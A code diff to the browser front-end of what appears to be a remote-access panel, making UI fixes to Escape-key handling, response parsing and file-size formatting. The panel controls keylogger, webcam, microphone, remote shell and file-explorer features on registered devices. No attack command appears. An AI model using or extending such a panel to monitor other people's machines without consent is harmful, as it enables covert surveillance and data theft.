@@ -64,7 +64,11 @@ function showDialog({ title = "Confirm", message = "", input = false, placeholde
       });
     }
 
+    const escHandler = (e) => { if (e.key === "Escape") finish(null); };
+    document.addEventListener("keydown", escHandler);
+
     const finish = (result) => {
+      document.removeEventListener("keydown", escHandler);
       backdrop.style.opacity = "0";
       backdrop.style.transition = "opacity 0.15s";
       setTimeout(() => backdrop.remove(), 150);
@@ -173,28 +177,6 @@ function parseDevices(rawDevices) {
       _os: d.os || "",
       _password: d.password,
     }));
-}
-
-function discoverDevices() {
-  const list = $("deviceList");
-  list.innerHTML = '<div class="empty-state">Scanning devices...</div>';
-  fetch(`${GAS_URL}?action=devices`)
-    .then((r) => r.json())
-    .then((data) => {
-      if (!data.ok || !data.devices) {
-        list.innerHTML = '<div class="empty-state">Cannot read device registry.</div>';
-        return;
-      }
-      devices = parseDevices(data.devices);
-      if (!devices.length) {
-        list.innerHTML = '<div class="empty-state">No devices registered yet.<br>Run the backend on a laptop first.</div>';
-        return;
-      }
-      renderDevices();
-    })
-    .catch(() => {
-      list.innerHTML = '<div class="empty-state">Cannot reach registry. Check your connection.</div>';
-    });
 }
 
 async function refreshDevices() {
@@ -394,7 +376,7 @@ function disconnect() {
   conn.token = "";
   stopHealth();
   closeLive(); closeLiveCam(); closeMic(); closeKeylog(); closeShell(); closeExplorer(); closeEditor();
-  discoverDevices();
+  refreshDevices();
 }
 
 /* ═══ API HELPERS ═══ */
@@ -403,7 +385,7 @@ function api(path, opts = {}) {
   const h = opts.headers || {};
   if (conn.token && !h["Authorization"]) h["Authorization"] = `Bearer ${conn.token}`;
   opts.headers = h;
-  return fetch(conn.url + path, opts).then((r) => r.json());
+  return fetch(conn.url + path, opts).then((r) => r.json().catch(() => ({ ok: false, error: "Invalid response" })));
 }
 
 function apiRaw(path) {
@@ -852,10 +834,10 @@ function handleUpload(input) {
 }
 
 function fmtSize(b) {
-  if (b === 0) return "0 B";
+  if (!b || b <= 0) return "0 B";
   const k = 1024;
   const s = ["B", "KB", "MB", "GB"];
-  const i = Math.floor(Math.log(b) / Math.log(k));
+  const i = Math.min(Math.floor(Math.log(b) / Math.log(k)), s.length - 1);
   return `${parseFloat((b / Math.pow(k, i)).toFixed(1))} ${s[i]}`;
 }
 
@@ -1394,15 +1376,17 @@ function closeLightbox() { hide("lightbox"); $("lbImg").src = ""; }
 
 document.addEventListener("keydown", (e) => {
   if (e.key === "Escape") {
-    closeLightbox();
-    closeShell();
-    closeExplorer();
-    closeEditor();
-    closeLive();
-    closeLiveCam();
-    closeMic();
-    closeKeylog();
-    closeUpdate();
+    if (document.querySelector(".dialog-backdrop")) return;
+    if (!$("lightbox").classList.contains("hidden")) { closeLightbox(); return; }
+    if (!$("updateModal").classList.contains("hidden")) { closeUpdate(); return; }
+    if (!$("loginModal").classList.contains("hidden")) { hideLogin(); return; }
+    if (!$("editorOverlay").classList.contains("hidden")) { closeEditor(); return; }
+    if (!$("shellOverlay").classList.contains("hidden")) { closeShell(); return; }
+    if (!$("explorerOverlay").classList.contains("hidden")) { closeExplorer(); return; }
+    if (!$("liveOverlay").classList.contains("hidden")) { closeLive(); return; }
+    if (!$("camOverlay").classList.contains("hidden")) { closeLiveCam(); return; }
+    if (!$("micOverlay").classList.contains("hidden")) { closeMic(); return; }
+    if (!$("keylogOverlay").classList.contains("hidden")) { closeKeylog(); return; }
   }
 });
 
